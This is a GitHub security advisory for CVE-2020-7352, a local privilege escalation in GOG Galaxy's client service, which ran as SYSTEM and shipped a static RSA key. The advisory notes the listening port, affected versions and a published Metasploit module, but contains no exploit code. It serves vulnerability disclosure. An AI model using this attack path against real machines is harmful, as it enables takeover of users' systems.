  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-chcw-6743-7jr7)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [Unreviewed](/advisories?query=type%3Aunreviewed)
3. [CVE-2020-7352](/advisories/GHSA-chcw-6743-7jr7)

## The GalaxyClientService component of GOG Galaxy runs with...

High severity

Unreviewed

Published
May 24, 2022
to the GitHub Advisory Database
‚Ä¢
Updated Jan 27, 2023

## Package

No package listed‚Äî
[Suggest a package](/advisories/GHSA-chcw-6743-7jr7/improve)

## Affected versions

Unknown

## Patched versions

Unknown

## Description

The GalaxyClientService component of GOG Galaxy runs with elevated SYSTEM privileges in a Windows environment. Due to the software shipping with embedded, static RSA private key, an attacker with this key material and local user permissions can effectively send any operating system command to the service for execution in this elevated context. The service listens for such commands on a locally-bound network port, localhost:9978. A Metasploit module has been published which exploits this vulnerability. This issue affects the 2.0.x branch of the software (2.0.12 and earlier) as well as the 1.2.x branch (1.2.64 and earlier). A fix was issued for the 2.0.x branch of the affected software.

### References

* <https://nvd.nist.gov/vuln/detail/CVE-2020-7352>
* [rapid7/metasploit-framework#13444](https://github.com/rapid7/metasploit-framework/pull/13444)
* <https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/>

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2020-7352)
Aug 6, 2020

Published to the GitHub Advisory Database
May 24, 2022

Last updated
Jan 27, 2023

### Severity

High

8.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Local

Attack complexity
Low

Privileges required
Low

User interaction
None

Scope
Changed

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

### [EPSS score](https://www.first.org/epss/user-guide)

0.273%
 (68th percentile)

### Weaknesses

[CWE-798](/advisories?query=cwe%3A798)

### CVE ID

CVE-2020-7352

### GHSA ID

GHSA-chcw-6743-7jr7

### Source code

No known source code

Dependabot alerts are not supported on this advisory because it does not have a package from a supported ecosystem with an affected and fixed version.

[Learn more about GitHub language support](https://docs.github.com/get-started/learning-about-github/github-language-support#about-supported-languages)

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-chcw-6743-7jr7/improve).

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.


